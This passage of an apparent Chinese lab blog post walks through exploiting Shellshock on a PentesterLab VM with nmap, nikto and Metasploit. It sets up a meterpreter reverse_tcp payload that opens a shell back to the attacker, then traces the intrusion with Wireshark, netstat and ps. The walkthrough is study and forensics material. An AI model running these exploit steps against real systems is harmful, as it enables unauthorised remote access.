id="安裝此環境">安裝此環境</h3><p>第一次看到這麼小的iso我都還不知道怎麼安裝(約30MB左右)，原來這東西就跟我們裝開機蝶的那種環境類似<br>直接新增一台虛擬機的環境下，並載入就好它會自行啟動配置好了</p><a href="https://imgur.com/h3F9pfM.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/h3F9pfM.png" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><hr><h2 id="攻擊">攻擊</h2><h4 id="需先準備軟體">需先準備軟體</h4><ol><li><strong>nmap</strong></li><li><strong>nikto</strong></li><li><strong>arp-scan</strong></li><li><strong>metasploit</strong><br>基本上準備個Kali Linux就能操作這次攻擊</li></ol><h3 id="攻擊流程">攻擊流程</h3><h4 id="1-先使用arp-scan找到我們的目標主機">1. 先使用<strong>arp-scan</strong>找到我們的目標主機</h4><p>這一步也可使用各種工具找到對方即可<br>或是直接在目標主機輸入ifconfig</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arp-scan -l         </span></span><br><span class="line">[sudo] password for susu: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: ***********, IPv4: 192.168.20.134</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.20.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.20.200:50:56:e6:11:13VMware, Inc.</span><br><span class="line">192.168.20.13100:0c:29:86:4c:69VMware, Inc. &lt;------這次的目標</span><br><span class="line">192.168.20.25400:50:56:e3:02:85VMware, Inc.</span><br></pre></td></tr></table></figure></div><h4 id="2-使用nmap尋找目標主機有哪些服務">2. 使用nmap尋找目標主機有哪些服務</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -A 192.168.20.131</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-05 15:35 CST</span><br><span class="line">Nmap scan report for 192.168.20.131</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8b:4c:a0:14:1c:3c:8c:29:3a:16:1c:f8:1a:70:2a:f3 (DSA)</span><br><span class="line">|   2048 d9:91:5d:c3:ed:78:b5:8c:9a:22:34:69:d5:68:6d:4e (RSA)</span><br><span class="line">|_  256 b2:23:9a:fa:a7:7a:cb:cd:30:85:f9:cb:b8:17:ae:05 (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.2.21 (Unix) DAV/2</span><br><span class="line">|_http-title: [PentesterLab] CVE-2014-6271</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds</span><br></pre></td></tr></table></figure></div><h4 id="3-尋找弱點">3. 尋找弱點</h4><p>從nmap中我們可發現web服務的存在，我們再使用主要用來掃網頁用的<strong>nikto</strong>來進一步的掃描</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nikto -h 192.168.20.131</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.20.131</span><br><span class="line">+ Target Hostname:    192.168.20.131</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2021-12-05 15:35:33 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.21 (Unix) DAV/2</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 7725, size: 1704, mtime: Thu Sep 25 17:56:50 2014</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true</span><br><span class="line">+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-3268: /css/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /css/: This might be interesting...</span><br><span class="line">+ 8725 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2021-12-05 15:36:01 (GMT8) (28 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure></div><p>我們可在報告中發現在<code>/cgi-bin/status</code>有可疑漏洞</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</span><br></pre></td></tr></table></figure></div><h4 id="4-使用metasploit進行攻擊">4. 使用metasploit進行攻擊</h4><h5 id="1-啟動metasploit並尋找shellshock相關攻擊">(1) <strong>啟動metasploit並尋找shellshock相關攻擊</strong></h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> msfconsole</span></span><br><span class="line">msf6 &gt; search shellshock</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">   Name                                               Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                               ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)</span><br><span class="line">   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)</span><br><span class="line">   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner</span><br><span class="line">   3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)</span><br><span class="line">   4   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)</span><br><span class="line">   5   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)</span><br><span class="line">   6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)</span><br><span class="line">   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution</span><br><span class="line">   8   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)</span><br><span class="line">   9   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)</span><br><span class="line">   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)</span><br><span class="line">   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec</span><br></pre></td></tr></table></figure></div><p>我們可在看到 1 為我們想要進行的攻擊</p><p><code>  1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)</code></p><h5 id="2-use-我們找到的辦法">(2) <strong>use 我們找到的辦法</strong></h5><p>可注意到我們的所選的方法變成了紅字了</p><pre><u style="text-decoration-style:single">msf6</u> &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec<font color="#277FFF"><b>[*]</b></font> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/http/apache_mod_cgi_bash_env_exec</b></font>) &gt; </pre><h5 id="3-設定options">(3) <strong>設定options</strong></h5><p>先輸入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   CMD_MAX_LENGTH  2048             yes       CMD max line length</span><br><span class="line">   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)</span><br><span class="line">   HEADER          User-Agent       yes       HTTP header to use</span><br><span class="line">   METHOD          GET              yes       HTTP method to use</span><br><span class="line">   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager</span><br><span class="line">   RPORT           80               yes       The target port (TCP)</span><br><span class="line">   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT         8080             yes       The local port to listen on.</span><br><span class="line">   SSL             false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   TARGETURI                        yes       Path to CGI script</span><br><span class="line">   TIMEOUT         5                yes       HTTP read response timeout (seconds)</span><br><span class="line">   URIPATH                          no        The URI to use for this exploit (default is random)</span><br><span class="line">   VHOST                            no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.20.134   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Linux x86</span><br></pre></td></tr></table></figure></div><p>我們需要設定以下這幾個options</p><ul><li><strong>lhost</strong> 攻擊者ip</li><li><strong>rhost</strong> 目標主機ip</li><li><strong>payload</strong> 攻擊成功後要做的動作</li><li><strong>targeturi</strong> 目標的漏洞網頁</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set lhost 192.168.20.134</span><br><span class="line">lhost =&gt; 192.168.20.134</span><br><span class="line">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set rhost 192.168.20.131</span><br><span class="line">rhost =&gt; 192.168.20.131</span><br><span class="line">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set targeturi http://192.168.20.131/cgi-bin/status</span><br><span class="line">targeturi =&gt; http://192.168.20.131/cgi-bin/status</span><br></pre></td></tr></table></figure></div><p>至此，攻擊的準備工作完成了</p><p><em>題外話</em></p><p>常常我們都把<strong>exploit</strong>、<strong>auxiliary</strong>、<strong>payload</strong>搞混</p><p>講師用了一個講法我覺得很容易懂，分享一下</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>exploit</td><td>槍</td></tr><tr><td>auxiliary</td><td>輔助工具</td></tr><tr><td>payload</td><td>子彈</td></tr></tbody></table><p>子彈(payload)無法主動攻擊，需要有槍(exploit)的輔助才行<br>子彈(payload)可以理解攻擊進入後目標電腦，我們要幹什麼壞事或提權<br>而槍(exploit)可以自己進行攻擊，例如用<s>槍托打人</s><br>輔助工具(auxiliary)也可以，例如槍掛榴彈</p><h5 id="4-攻擊">(4) <strong>攻擊</strong></h5><p>在攻擊前，我們也可以開始啟用相關的監測軟體，基本上是把你想到的都打開看看<br>我這邊想到的是，可以透過Wireshark抓取之間的封包<br>完成了之後，可以輸入run指令開始攻擊</p><pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/http/apache_mod_cgi_bash_env_exec</b></font>) &gt; run<font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 192.168.20.134:4444 <font color="#277FFF"><b>[*]</b></font> Command Stager progress - 100.46% done (1097/1092 bytes)<font color="#277FFF"><b>[*]</b></font> Sending stage (984904 bytes) to 192.168.20.131<font color="#277FFF"><b>[*]</b></font> Meterpreter session 1 opened (192.168.20.134:4444 -&gt; 192.168.20.131:56191) at 2021-12-05 16:36:00 +0800<u style="text-decoration-style:single">meterpreter</u> &gt; </pre><p>至此，攻擊成功<br>我們可輸入<code>shell</code>變成指令介面<br>便可開始操作目標電腦</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 950 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">whoami</span><br><span class="line">pentesterlab</span><br><span class="line">who</span><br><span class="line">pentesterlab    tty1            00:04   Dec  5 14:19:43</span><br></pre></td></tr></table></figure></div><hr><h2 id="鑑識">鑑識</h2><h4 id="需先準備軟體-v2">需先準備軟體</h4><ol><li><strong>Wireshark</strong></li></ol><p>我們在攻擊過後，便可在相關基礎設施中，尋找是否有殘餘的封包<br>在本次的練習中，我便開啟wireshark收集攻擊時的封包</p><h4 id="Wireshark">Wireshark</h4><p>在收集到的封包中，可得知 192.168.20.134 向 192.168.20.131 發送了奇怪的惡意內容<br><a href="https://imgur.com/7EkR9KL.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/7EkR9KL.png" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>完整內容<br><a href="https://imgur.com/61dcxeu.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/61dcxeu.png" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p><h4 id="在受害主機上尋找殘骸">在受害主機上尋找殘骸</h4><h5 id="1-查詢網路連接狀況">1. <strong>查詢網路連接狀況</strong></h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> netstat -a</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       </span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      </span><br><span class="line">tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED </span><br><span class="line">tcp        0      0 :::www                  :::*                    LISTEN      </span><br><span class="line">tcp        0      0 :::ssh                  :::*                    LISTEN      </span><br><span class="line">tcp        1      0 ::ffff:192.168.20.131:www ::ffff:192.168.20.134:34275 CLOSE_WAIT  </span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node Path</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING       7711 /var/run/acpid.socket</span><br><span class="line">unix  2      [ ACC ]     SEQPACKET  LISTENING       6334 @/org/kernel/udev/udevd</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING       7909 /usr/local/apache2/logs/cgisock.695</span><br><span class="line">unix  3      [ ]         DGRAM                      6342 </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED       8538 /usr/local/apache2/logs/cgisock.695</span><br><span class="line">unix  3      [ ]         DGRAM                      6343 </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED       8540</span><br></pre></td></tr></table></figure></div><p>可看到目前有一個可疑的ip連接中<br><code>tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED</code></p><h5 id="2-查詢可疑程式">2. <strong>查詢可疑程式</strong></h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ef</span></span><br><span class="line">PID   USER     COMMAND</span><br><span class="line">    1 root     init</span><br><span class="line">    2 root     [kthreadd]</span><br><span class="line">    3 root     [ksoftirqd/0]</span><br><span class="line">    5 root     [kworker/0:0H]</span><br><span class="line">    6 root     [kworker/u16:0]</span><br><span class="line">    7 root     [rcu_sched]</span><br><span class="line">    8 root     [rcu_bh]</span><br><span class="line">    9 root     [migration/0]</span><br><span class="line">   10 root     [khelper]</span><br><span class="line">   11 root     [netns]</span><br><span class="line">   12 root     [writeback]</span><br><span class="line">   13 root     [ksmd]</span><br><span class="line">   14 root     [bioset]</span><br><span class="line">   15 root     [kblockd]</span><br><span class="line">   16 root     [ata_sff]</span><br><span class="line">   17 root     [khubd]</span><br><span class="line">   18 root     [kworker/0:1]</span><br><span class="line">   31 root     [kswapd0]</span><br><span class="line">   32 root     [fsnotify_mark]</span><br><span class="line">   33 root     [crypto]</span><br><span class="line">   49 root     [nvme]</span><br><span class="line">   50 root     [nvme]</span><br><span class="line">   51 root     [scsi_eh_0]</span><br><span class="line">   52 root     [scsi_tmf_0]</span><br><span class="line">   53 root     [scsi_eh_1]</span><br><span class="line">   54 root     [scsi_tmf_1]</span><br><span class="line">   55 root     [kworker/u16:1]</span><br><span class="line">   57 root     [kpsmoused]</span><br><span class="line">   59 root     [deferwq]</span><br><span class="line">   61 root     [kworker/0:3]</span><br><span class="line">   92 root     /sbin/udevd --daemon</span><br><span class="line">  382 root     [mpt_poll_0]</span><br><span class="line">  400 root     [mpt/0]</span><br><span class="line">  613 root     [ipv6_addrconf]</span><br><span class="line">  614 root     /usr/local/sbin/sshd</span><br><span class="line">  618 root     /usr/local/sbin/acpid</span><br><span class="line">  640 root     [scsi_eh_2]</span><br><span class="line">  641 root     [scsi_tmf_2]</span><br><span class="line">  646 root     /sbin/udevd --daemon</span><br><span class="line">  647 root     /sbin/udevd --daemon</span><br><span class="line">  695 root     /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  696 penteste -sh</span><br><span class="line">  702 root     /sbin/getty -l /usr/local/bin/autologin 9600 ttyS0 vt100</span><br><span class="line">  742 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  743 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  744 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  745 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  839 root     /sbin/udhcpc -b -i eth0 -x hostname vulnerable -p /var/run/udhcpc.eth0.pid</span><br><span class="line">  866 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start</span><br><span class="line">  947 penteste &#123;status&#125; /bin/bash /var/www/cgi-bin/status</span><br><span class="line">  948 penteste &#123;status&#125; /bin/bash /var/www/cgi-bin/status</span><br><span class="line">  949 penteste /tmp/kENhE</span><br><span class="line">  950 penteste /bin/sh</span><br><span class="line">  974 penteste ps -ef</span><br></pre></td></tr></table></figure></div><p>可看到有幾個看起來很可疑的程式<br><code>947 penteste {status} /bin/bash /var/www/cgi-bin/status</code><br><code>948 penteste {status} /bin/bash /var/www/cgi-bin/status</code><br><code>949 penteste /tmp/kENhE</code><br><code>950 penteste /bin/sh</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo netstat -antp</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      614/sshd</span><br><span class="line">tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED 949/kENhE &lt;----原來是你</span><br><span class="line">tcp        0      0 :::80                   :::*                    LISTEN      695/httpd</span><br><span class="line">tcp        0      0 :::22                   :::*                    LISTEN      614/sshd</span><br><span class="line">tcp        1      0 ::ffff:192.168.20.131:80 ::ffff:192.168.20.134:34275 CLOSE_WAIT  745/httpd</span><br></pre></td></tr></table></figure></div><p>我們可猜測PID:949<code>/tmp/kENhE</code>便有可能是攻擊者的惡意程式<br>從攻擊方meterpreter確認，也是如此</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 949</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: pentesterlab @ vulnerable (uid=1000, gid=50, euid=1000, egid=50)</span><br></pre></td></tr></table></figure></div><hr><h2 id="補充">補充</h2><p>這篇所練習的PENTESTER LAB所提供的環境似乎太過精簡 <img class="emoji lazyload" draggable="false" alt="😂" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f602.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>以至log似乎也未開啟，這邊我再用 Metasploitable 2 再練習一遍<br>由於他本身沒有自帶這個漏洞<br>可參考這個網站建立一個shellshock漏洞<br><a 